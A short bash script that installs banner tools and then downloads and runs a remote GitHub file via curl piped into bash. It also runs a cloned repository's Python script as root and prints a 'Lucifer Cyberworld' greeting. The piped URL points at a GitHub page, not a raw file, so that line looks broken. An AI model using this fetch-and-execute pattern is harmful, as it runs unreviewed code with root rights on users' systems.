#!/bin/bash

# Update package list and install git, figlet, curl, and lolcat
if command -v apt-get &>/dev/null; then
    sudo apt update && sudo apt install git figlet curl lolcat -y
elif command -v yum &>/dev/null; then
    sudo yum install git figlet curl lolcat -y
elif command -v dnf &>/dev/null; then
    sudo dnf install git figlet curl lolcat -y
elif command -v pacman &>/dev/null; then
    sudo pacman -S git figlet curl lolcat --noconfirm
else
    echo "Unsupported package manager. Exiting."
    exit 1
fi



# Print a fun message using lolcat
echo "This is a message in lolcat!" | lolcat

# Download and execute the remote script via curl
curl -sSL https://github.com/farooq-001/emil/blob/master/hello | bash

# Clone the repository
sudo git clone https://github.com/farooq-001/emil.git

# Change file permissions
sudo chmod 644 /home/snb-tech/.iplist.txt

# Run the Python script
sudo python3 emil/ip.py

# Clean up by removing the cloned repository
sudo rm -rf emil

# Print the welcome message using figlet
figlet -f slant -c "Hello $USER" | lolcat
figlet -f digital -c "Hi Mr/Miss Welcome to The Lucifer Cyberworld" | lolcat
